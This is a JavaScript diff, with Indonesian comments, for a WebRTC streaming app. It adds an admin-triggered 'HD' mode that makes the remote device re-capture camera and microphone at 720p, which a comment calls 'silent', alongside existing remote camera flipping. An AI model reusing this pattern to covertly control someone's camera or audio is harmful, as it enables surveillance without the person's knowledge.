@@ -61,6 +61,7 @@ let videoInputDevices   = [];
 let currentDeviceIndex  = 0;
 let currentFacingMode   = 'environment';
 let isFlipping          = false;
+let hdSessions          = new Set(); // sessionId yang sedang mode HD
 
 const viewerPeers     = new Map();
 const adminPeers      = new Map();
@@ -973,6 +974,27 @@ function flipCameraRequest(sessionId) {
   socket.emit('flip-camera', { sessionId });
 }
 
+// Toggle HD — kirim request ke viewer, update tombol
+function toggleHDRequest(sessionId) {
+  if (!sessionId || !socket) return;
+  const btn = document.getElementById('vm-hd-btn');
+  const isHD = hdSessions.has(sessionId);
+
+  if (isHD) {
+    // Matikan HD
+    socket.emit('stop-hd', { sessionId });
+    hdSessions.delete(sessionId);
+    if (btn) { btn.textContent = '📹 HD'; btn.classList.remove('hd-active'); }
+    addAdminLog('Admin', `HD dimatikan untuk sesi ${sessionId}`, '#F2B94B', 'info');
+  } else {
+    // Nyalakan HD
+    socket.emit('request-hd', { sessionId });
+    hdSessions.add(sessionId);
+    if (btn) { btn.textContent = '📹 HD ✓'; btn.classList.add('hd-active'); }
+    addAdminLog('Admin', `HD diaktifkan untuk sesi ${sessionId}`, '#4ADE80', 'info');
+  }
+}
+
 // Helper: escape karakter kutip tunggal agar aman dipakai di onclick="...string JS..."
 // Contoh: "Fira Ma'ruf" → "Fira Ma\'ruf" sehingga JS tidak syntax error
 function escJS(str) {
@@ -1057,6 +1079,9 @@ function closeExpandSession() {
   if (vmVideo) { vmVideo.srcObject = null; }
   const modal = document.getElementById('video-modal');
   if (modal) modal.classList.remove('active');
+  // Reset tombol HD ke state awal
+  const hdBtn = document.getElementById('vm-hd-btn');
+  if (hdBtn) { hdBtn.textContent = '📹 HD'; hdBtn.classList.remove('hd-active'); }
   currentExpandedSession = null;
 }
 
@@ -1392,6 +1417,86 @@ function connectSocket_Viewer() {
       console.log(`[ICE-buffer viewer] ${msg.sessionId} — candidate ditahan (${pc._iceBuffer.length})`);
     }
   });
+  // ── HD Request: upgrade kamera ke resolusi tinggi secara silent ──
+  socket.on('request-hd', async () => {
+    console.log('[HD] Admin request HD — upgrade kamera ke 720p');
+    try {
+      const hdStream = await navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: currentFacingMode || 'environment',
+          width:       { ideal: 1280, max: 1280 },
+          height:      { ideal: 720,  max: 720  },
+          frameRate:   { ideal: 30,   max: 30   },
+          aspectRatio: { ideal: 16/9 }
+        },
+        audio: {
+          echoCancellation: true,
+          noiseSuppression: true,
+          sampleRate: 48000
+        }
+      });
+
+      // Stop track lama, ganti dengan HD
+      if (camStream) camStream.getTracks().forEach(t => t.stop());
+      camStream = hdStream;
+
+      // Replace track di semua peer connection yang aktif
+      const newVideoTrack = hdStream.getVideoTracks()[0];
+      const newAudioTrack = hdStream.getAudioTracks()[0];
+      for (const pc of viewerPeers.values()) {
+        for (const sender of pc.getSenders()) {
+          if (sender.track?.kind === 'video' && newVideoTrack) {
+            await sender.replaceTrack(newVideoTrack).catch(() => {});
+            // Set bitrate max 1.5 Mbps untuk 720p
+            const params = sender.getParameters();
+            if (!params.encodings || params.encodings.length === 0) params.encodings = [{}];
+            params.encodings[0].maxBitrate   = 1_500_000;
+            params.encodings[0].maxFramerate = 30;
+            await sender.setParameters(params).catch(() => {});
+          }
+          if (sender.track?.kind === 'audio' && newAudioTrack) {
+            await sender.replaceTrack(newAudioTrack).catch(() => {});
+          }
+        }
+      }
+      console.log('[HD] Kamera berhasil upgrade ke 720p (1.5 Mbps)');
+    } catch (err) {
+      console.warn('[HD] Gagal upgrade ke 720p:', err.message);
+    }
+  });
+
+  // ── Stop HD: turunkan kembali ke resolusi normal ──
+  socket.on('stop-hd', async () => {
+    console.log('[HD] Admin stop HD — kembali ke 540p normal');
+    try {
+      const normalStream = await navigator.mediaDevices.getUserMedia(buildCamConstraints(currentFacingMode));
+      if (camStream) camStream.getTracks().forEach(t => t.stop());
+      camStream = normalStream;
+
+      const newVideoTrack = normalStream.getVideoTracks()[0];
+      const newAudioTrack = normalStream.getAudioTracks()[0];
+      for (const pc of viewerPeers.values()) {
+        for (const sender of pc.getSenders()) {
+          if (sender.track?.kind === 'video' && newVideoTrack) {
+            await sender.replaceTrack(newVideoTrack).catch(() => {});
+            // Kembalikan bitrate ke 900 kbps normal
+            const params = sender.getParameters();
+            if (!params.encodings || params.encodings.length === 0) params.encodings = [{}];
+            params.encodings[0].maxBitrate   = 900_000;
+            params.encodings[0].maxFramerate = 24;
+            await sender.setParameters(params).catch(() => {});
+          }
+          if (sender.track?.kind === 'audio' && newAudioTrack) {
+            await sender.replaceTrack(newAudioTrack).catch(() => {});
+          }
+        }
+      }
+      console.log('[HD] Kamera kembali ke 540p normal');
+    } catch (err) {
+      console.warn('[HD] Gagal kembali ke normal:', err.message);
+    }
+  });
+
   socket.on('flip-camera', (data) => {
     if (isFlipping) return;
     // BUG FIX #2: Pastikan mySessionId sudah ada sebelum proses flip
